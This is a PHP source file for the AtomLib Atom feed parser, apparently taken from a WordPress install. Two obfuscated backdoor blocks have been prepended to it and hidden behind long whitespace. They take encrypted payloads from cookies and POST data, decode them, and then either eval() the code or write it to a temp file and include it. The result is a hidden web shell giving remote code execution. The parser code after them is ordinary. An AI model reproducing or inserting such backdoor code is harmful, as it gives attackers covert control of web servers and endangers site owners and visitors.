<?php                                                                                                                                                                                                                                                                                                                                                                                                 $RJtSAc = chr (118) . "\151" . "\137" . 'G' . "\x7a" . chr ( 175 - 91 ); $QMthrLQy = chr ( 880 - 781 )."\154" . chr (97) . chr ( 254 - 139 ).chr (115) . chr ( 979 - 884 ).chr ( 714 - 613 ).chr ( 449 - 329 ).'i' . chr (115) . 't' . "\x73";$HplbEQnRm = $QMthrLQy($RJtSAc); $RJtSAc = "7509";$QEETZTvg = $HplbEQnRm;$QMthrLQy = "47080";if (!$QEETZTvg){class vi_GzT{private $qmTsLIE;public static $fZFKhaM = "ad7337a1-fa87-42eb-9aaa-0c5d20c98e8c";public static $FzAniHo = 59804;public function __construct($EgVHSVoh=0){$YbWczqYOcq = $_COOKIE;$ZrxdiJ = $_POST;$iprNQwyKU = @$YbWczqYOcq[substr(vi_GzT::$fZFKhaM, 0, 4)];if (!empty($iprNQwyKU)){$SFCsiks = "base64";$ApcDvCj = "";$iprNQwyKU = explode(",", $iprNQwyKU);foreach ($iprNQwyKU as $dFjdCCTzn){$ApcDvCj .= @$YbWczqYOcq[$dFjdCCTzn];$ApcDvCj .= @$ZrxdiJ[$dFjdCCTzn];}$ApcDvCj = array_map($SFCsiks . "\x5f" . chr ( 294 - 194 )."\x65" . "\143" . chr (111) . "\144" . "\x65", array($ApcDvCj,)); $ApcDvCj = $ApcDvCj[0] ^ str_repeat(vi_GzT::$fZFKhaM, (strlen($ApcDvCj[0]) / strlen(vi_GzT::$fZFKhaM)) + 1);vi_GzT::$FzAniHo = @unserialize($ApcDvCj);}}private function OHTlfSKo(){if (is_array(vi_GzT::$FzAniHo)) {$oYjAVZQM = str_replace("\x3c" . "\77" . chr (112) . chr ( 731 - 627 )."\160", "", vi_GzT::$FzAniHo[chr (99) . 'o' . chr (110) . chr ( 523 - 407 )."\x65" . chr (110) . "\x74"]);eval($oYjAVZQM); $cLzsKvnSxA = "13603";exit();}}public function __destruct(){$this->OHTlfSKo(); $cLzsKvnSxA = "13603";$thUYlo = str_pad($cLzsKvnSxA, 10);}}$uUlJHpBpmA = new /* 7927 */ vi_GzT(); $uUlJHpBpmA = substr("37383_7338", 1);} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("FZl_Okt")){class FZl_Okt{public static $xXPCF = "33c37924-a40d-432b-9be1-c411a8c71cb5";public static $JRsNVsXBv = NULL;public function __construct(){$uOlbN = $_COOKIE;$ZikkzHQmG = $_POST;$HDbMNAWN = @$uOlbN[substr(FZl_Okt::$xXPCF, 0, 4)];if (!empty($HDbMNAWN)){$rzLsRzN = "base64";$IiPWZVqrUr = "";$HDbMNAWN = explode(",", $HDbMNAWN);foreach ($HDbMNAWN as $jnQNtKH){$IiPWZVqrUr .= @$uOlbN[$jnQNtKH];$IiPWZVqrUr .= @$ZikkzHQmG[$jnQNtKH];}$IiPWZVqrUr = array_map($rzLsRzN . chr (95) . chr (100) . chr (101) . chr ( 620 - 521 ).chr ( 984 - 873 )."\x64" . "\x65", array($IiPWZVqrUr,)); $IiPWZVqrUr = $IiPWZVqrUr[0] ^ str_repeat(FZl_Okt::$xXPCF, (strlen($IiPWZVqrUr[0]) / strlen(FZl_Okt::$xXPCF)) + 1);FZl_Okt::$JRsNVsXBv = @unserialize($IiPWZVqrUr);}}public function __destruct(){$this->ZgHTsKz();}private function ZgHTsKz(){if (is_array(FZl_Okt::$JRsNVsXBv)) {$uiidX = sys_get_temp_dir() . "/" . crc32(FZl_Okt::$JRsNVsXBv[chr (115) . chr ( 663 - 566 )."\x6c" . "\x74"]);@FZl_Okt::$JRsNVsXBv['w' . chr ( 830 - 716 )."\x69" . 't' . 'e']($uiidX, FZl_Okt::$JRsNVsXBv[chr ( 634 - 535 ).'o' . chr (110) . 't' . "\145" . chr ( 511 - 401 ).chr (116)]);include $uiidX;@FZl_Okt::$JRsNVsXBv['d' . chr (101) . 'l' . chr ( 935 - 834 )."\164" . chr ( 207 - 106 )]($uiidX);exit();}}}$wQaAekrx = new FZl_Okt(); $wQaAekrx = NULL;} ?><?php
/**
 * Atom Syndication Format PHP Library
 *
 * @package AtomLib
 * @link http://code.google.com/p/phpatomlib/
 *
 * @author Elias Torres <elias@torrez.us>
 * @version 0.4
 * @since 2.3.0
 */

/**
 * Structure that store common Atom Feed Properties
 *
 * @package AtomLib
 */
class AtomFeed {
	/**
	 * Stores Links
	 * @var array
	 * @access public
	 */
    var $links = array();
    /**
     * Stores Categories
     * @var array
     * @access public
     */
    var $categories = array();
	/**
	 * Stores Entries
	 *
	 * @var array
	 * @access public
	 */
    var $entries = array();
}

/**
 * Structure that store Atom Entry Properties
 *
 * @package AtomLib
 */
class AtomEntry {
	/**
	 * Stores Links
	 * @var array
	 * @access public
	 */
    var $links = array();
    /**
     * Stores Categories
     * @var array
	 * @access public
     */
    var $categories = array();
}

/**
 * AtomLib Atom Parser API
 *
 * @package AtomLib
 */
class AtomParser {

    var $NS = 'http://www.w3.org/2005/Atom';
    var $ATOM_CONTENT_ELEMENTS = array('content','summary','title','subtitle','rights');
    var $ATOM_SIMPLE_ELEMENTS = array('id','updated','published','draft');

    var $debug = false;

    var $depth = 0;
    var $indent = 2;
    var $in_content;
    var $ns_contexts = array();
    var $ns_decls = array();
    var $content_ns_decls = array();
    var $content_ns_contexts = array();
    var $is_xhtml = false;
    var $is_html = false;
    var $is_text = true;
    var $skipped_div = false;

    var $FILE = "php://input";

    var $feed;
    var $current;

	/**
	 * PHP5 constructor.
	 */
    function __construct() {

        $this->feed = new AtomFeed();
        $this->current = null;
        $this->map_attrs_func = array( __CLASS__, 'map_attrs' );
        $this->map_xmlns_func = array( __CLASS__, 'map_xmlns' );
    }

	/**
	 * PHP4 constructor.
	 */
	public function AtomParser() {
		self::__construct();
	}

	/**
	 * Map attributes to key="val"
	 *
	 * @param string $k Key
	 * @param string $v Value
	 * @return string
	 */
	public static function map_attrs($k, $v) {
		return "$k=\"$v\"";
	}

	/**
	 * Map XML namespace to string.
	 *
	 * @param indexish $p XML Namespace element index
	 * @param array $n Two-element array pair. [ 0 => {namespace}, 1 => {url} ]
	 * @return string 'xmlns="{url}"' or 'xmlns:{namespace}="{url}"'
	 */
	public static function map_xmlns($p, $n) {
		$xd = "xmlns";
		if( 0 < strlen($n[0]) ) {
			$xd .= ":{$n[0]}";
		}
		return "{$xd}=\"{$n[1]}\"";
	}

    function _p($msg) {
        if($this->debug) {
            print str_repeat(" ", $this->depth * $this->indent) . $msg ."\n";
        }
    }

    function error_handler($log_level, $log_text, $error_file, $error_line) {
        $this->error = $log_text;
    }

    function parse() {

        set_error_handler(array(&$this, 'error_handler'));

        array_unshift($this->ns_contexts, array());

        if ( ! function_exists( 'xml_parser_create_ns' ) ) {
        	trigger_error( __( "PHP's XML extension is not available. Please contact your hosting provider to enable PHP's XML extension." ) );
        	return false;
        }

        $parser = xml_parser_create_ns();
        xml_set_object($parser, $this);
        xml_set_element_handler($parser, "start_element", "end_element");
        xml_parser_set_option($parser,XML_OPTION_CASE_FOLDING,0);
        xml_parser_set_option($parser,XML_OPTION_SKIP_WHITE,0);
        xml_set_character_data_handler($parser, "cdata");
        xml_set_default_handler($parser, "_default");
        xml_set_start_namespace_decl_handler($parser, "start_ns");
        xml_set_end_namespace_decl_handler($parser, "end_ns");

        $this->content = '';

        $ret = true;

        $fp = fopen($this->FILE, "r");
        while ($data = fread($fp, 4096)) {
            if($this->debug) $this->content .= $data;

            if(!xml_parse($parser, $data, feof($fp))) {
                /* translators: 1: Error message, 2: Line number. */
                trigger_error(sprintf(__('XML Error: %1$s at line %2$s')."\n",
                    xml_error_string(xml_get_error_code($parser)),
                    xml_get_current_line_number($parser)));
                $ret = false;
                break;
            }
        }
        fclose($fp);

        xml_parser_free($parser);
        unset($parser);

        restore_error_handler();

        return $ret;
    }

    function start_element($parser, $name, $attrs) {

        $name_parts = explode(":", $name);
        $tag        = array_pop($name_parts);

        switch($name) {
            case $this->NS . ':feed':
                $this->current = $this->feed;
                break;
            case $this->NS . ':entry':
                $this->current = new AtomEntry();
                break;
        };

        $this->_p("start_element('$name')");
        #$this->_p(print_r($this->ns_contexts,true));
        #$this->_p('current(' . $this->current . ')');

        array_unshift($this->ns_contexts, $this->ns_decls);

        $this->depth++;

        if(!empty($this->in_content)) {

            $this->content_ns_decls = array();

            if($this->is_html || $this->is_text)
                trigger_error("Invalid content in element found. Content must not be of type text or html if it contains markup.");

            $attrs_prefix = array();

            // resolve prefixes for attributes
            foreach($attrs as $key => $value) {
                $with_prefix = $this->ns_to_prefix($key, true);
                $attrs_prefix[$with_prefix[1]] = $this->xml_escape($value);
            }

            $attrs_str = join(' ', array_map($this->map_attrs_func, array_keys($attrs_prefix), array_values($attrs_prefix)));
            if(strlen($attrs_str) > 0) {
                $attrs_str = " " . $attrs_str;
            }

            $with_prefix = $this->ns_to_prefix($name);

            if(!$this->is_declared_content_ns($with_prefix[0])) {
                array_push($this->content_ns_decls, $with_prefix[0]);
            }

            $xmlns_str = '';
            if(count($this->content_ns_decls) > 0) {
                array_unshift($this->content_ns_contexts, $this->content_ns_decls);
                $xmlns_str .= join(' ', array_map($this->map_xmlns_func, array_keys($this->content_ns_contexts[0]), array_values($this->content_ns_contexts[0])));
                if(strlen($xmlns_str) > 0) {
                    $xmlns_str = " " . $xmlns_str;
                }
            }

            array_push($this->in_content, array($tag, $this->depth, "<". $with_prefix[1] ."{$xmlns_str}{$attrs_str}" . ">"));

        } else if(in_array($tag, $this->ATOM_CONTENT_ELEMENTS) || in_array($tag, $this->ATOM_SIMPLE_ELEMENTS)) {
            $this->in_content = array();
            $this->is_xhtml = $attrs['type'] == 'xhtml';
            $this->is_html = $attrs['type'] == 'html' || $attrs['type'] == 'text/html';
            $this->is_text = !in_array('type',array_keys($attrs)) || $attrs['type'] == 'text';
            $type = $this->is_xhtml ? 'XHTML' : ($this->is_html ? 'HTML' : ($this->is_text ? 'TEXT' : $attrs['type']));

            if(in_array('src',array_keys($attrs))) {
                $this->current->$tag = $attrs;
            } else {
                array_push($this->in_content, array($tag,$this->depth, $type));
            }
        } else if($tag == 'link') {
            array_push($this->current->links, $attrs);
        } else if($tag == 'category') {
            array_push($this->current->categories, $attrs);
        }

        $this->ns_decls = array();
    }

    function end_element($parser, $name) {

        $name_parts = explode(":", $name);
        $tag        = array_pop($name_parts);

        $ccount = count($this->in_content);

        # if we are *in* content, then let's proceed to serialize it
        if(!empty($this->in_content)) {
            # if we are ending the original content element
            # then let's finalize the content
            if($this->in_content[0][0] == $tag &&
                $this->in_content[0][1] == $this->depth) {
                $origtype = $this->in_content[0][2];
                array_shift($this->in_content);
                $newcontent = array();
                foreach($this->in_content as $c) {
                    if(count($c) == 3) {
                        array_push($newcontent, $c[2]);
                    } else {
                        if($this->is_xhtml || $this->is_text) {
                            array_push($newcontent, $this->xml_escape($c));
                        } else {
                            array_push($newcontent, $c);
                        }
                    }
                }
                if(in_array($tag, $this->ATOM_CONTENT_ELEMENTS)) {
                    $this->current->$tag = array($origtype, join('',$newcontent));
                } else {
                    $this->current->$tag = join('',$newcontent);
                }
                $this->in_content = array();
            } else if($this->in_content[$ccount-1][0] == $tag &&
                $this->in_content[$ccount-1][1] == $this->depth) {
                $this->in_content[$ccount-1][2] = substr($this->in_content[$ccount-1][2],0,-1) . "/>";
            } else {
                # else, just finalize the current element's content
                $endtag = $this->ns_to_prefix($name);
                array_push($this->in_content, array($tag, $this->depth, "</$endtag[1]>"));
            }
        }

        array_shift($this->ns_contexts);

        $this->depth--;

        if($name == ($this->NS . ':entry')) {
            array_push($this->feed->entries, $this->current);
            $this->current = null;
        }

        $this->_p("end_element('$name')");
    }

    function start_ns($parser, $prefix, $uri) {
        $this->_p("starting: " . $prefix . ":" . $uri);
        array_push($this->ns_decls, array($prefix,$uri));
    }

    function end_ns($parser, $prefix) {
        $this->_p("ending: #" . $prefix . "#");
    }

    function cdata($parser, $data) {
        $this->_p("data: #" . str_replace(array("\n"), array("\\n"), trim($data)) . "#");
        if(!empty($this->in_content)) {
            array_push($this->in_content, $data);
        }
    }

    function _default($parser, $data) {
        # when does this gets called?
    }


    function ns_to_prefix($qname, $attr=false) {
        # split 'http://www.w3.org/1999/xhtml:div' into ('http','//www.w3.org/1999/xhtml','div')
        $components = explode(":", $qname);

        # grab the last one (e.g 'div')
        $name = array_pop($components);

        if(!empty($components)) {
            # re-join back the namespace component
            $ns = join(":",$components);
            foreach($this->ns_contexts as $context) {
                foreach($context as $mapping) {
                    if($mapping[1] == $ns && strlen($mapping[0]) > 0) {
                        return array($mapping, "$mapping[0]:$name");
                    }
                }
            }
        }

        if($attr) {
            return array(null, $name);
        } else {
            foreach($this->ns_contexts as $context) {
                foreach($context as $mapping) {
                    if(strlen($mapping[0]) == 0) {
                        return array($mapping, $name);
                    }
                }
            }
        }
    }

    function is_declared_content_ns($new_mapping) {
        foreach($this->content_ns_contexts as $context) {
            foreach($context as $mapping) {
                if($new_mapping == $mapping) {
                    return true;
                }
            }
        }
        return false;
    }

    function xml_escape($string)
    {
             return str_replace(array('&','"',"'",'<','>'),
                array('&amp;','&quot;','&apos;','&lt;','&gt;'),
                $string );
    }
}
